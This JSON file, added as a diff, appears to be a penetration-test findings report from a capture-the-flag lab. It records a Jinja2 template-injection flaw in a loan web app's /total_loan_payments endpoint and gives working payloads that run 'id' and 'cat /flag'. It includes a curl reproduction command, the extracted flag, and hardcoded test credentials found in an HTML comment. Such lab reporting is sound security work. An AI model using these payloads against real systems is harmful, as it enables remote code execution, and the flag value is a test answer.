@@ -1,0 +1,43 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:06:42.374298+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d8737ff6-ae88-4370-8c46-a907f425bb49",
+      "timestamp": "2026-04-13T11:06:42.374208+00:00",
+      "title": "Server-Side Template Injection (SSTI) via Jinja2 \u2014 RCE + Flag Extraction",
+      "severity": "critical",
+      "target": "http://172.17.0.1:42153/total_loan_payments",
+      "description": "The /total_loan_payments endpoint builds its JSON response by rendering user-supplied GET parameters directly inside a Jinja2 template without sanitization. The `principal` parameter is injected into the template context, allowing an authenticated attacker to execute arbitrary Jinja2 expressions and achieve full Remote Code Execution (RCE) as www-data on the underlying server. The CTF flag was extracted from /flag on the filesystem.",
+      "evidence": "SSTI confirmation: GET /total_loan_payments?principal={{7*7}} \u2192 {\"loan_principal\": \"49\"}\nRCE confirmation: GET /total_loan_payments?principal={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}} \u2192 uid=33(www-data)\nFlag extraction: GET /total_loan_payments?principal={{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /flag\").read()}} \u2192 flag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s --cookie 'session=<valid_session>' 'http://172.17.0.1:42153/total_loan_payments?principal=%7B%7Bconfig.__class__.__init__.__globals__%5B%22os%22%5D.popen%28%22cat+%2Fflag%22%29.read%28%29%7D%7D&payment=1&term=1'",
+        "expected": "flag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}"
+      }
+    },
+    {
+      "id": "c5be9825-c258-4af6-aa74-90958f6e618d",
+      "timestamp": "2026-04-13T11:06:47.248266+00:00",
+      "title": "Hardcoded Test Credentials in HTML Comment",
+      "severity": "high",
+      "target": "http://172.17.0.1:42153/login",
+      "description": "The login page HTML source contains a developer comment disclosing valid credentials: <!-- TODO: Delete the testing account (test:test). -->. This provides unauthenticated access to the application and was the initial access vector used before exploiting SSTI.",
+      "evidence": "HTML comment: <!-- TODO: Delete the testing account (test:test). -->\nSuccessful login: POST /login with username=test&password=test \u2192 302 redirect to /home with valid session cookie",
+      "tool_used": "manual",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "e1246588-24b4-4f81-a648-af6cc13cc81c",
+      "timestamp": "2026-04-13T11:07:04.399485+00:00",
+      "title": "Application Architecture and Attack Path",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Login[\"/login POST\\ntest:test credentials\"]\n  Login --> Session[\"Flask Session Cookie\\n{user_id: 1}\"]\n  Session --> Home[\"/home GET\\nWelcome John Doe\"]\n  Session --> Profile[\"/profile GET+POST\\nUpdate user details\"]\n  Session --> LoanDetails[\"/loan_details GET\\nLoan summary + AJAX trigger\"]\n  LoanDetails --> TotalLoan[\"/total_loan_payments GET\\nprincipal, payment, term params\"]\n  TotalLoan --> Jinja2[\"Jinja2 Template Renderer\\nBuilds JSON response\\nNO SANITIZATION\"]\n  Jinja2 --> SSTI[\"SSTI RCE\\n{{os.popen('cmd').read()}}\\nwww-data\"]\n  SSTI --> Flag[\"/flag\\nflag{5bb951bd-42ac-4fb5-918d-c82c340ffb1c}\"]\n  \n  subgraph Server [\"Apache 2.4.66 / Flask / Jinja2\"]\n    Jinja2\n    SSTI\n    Flag\n  end"
+    }
+  ]
+}
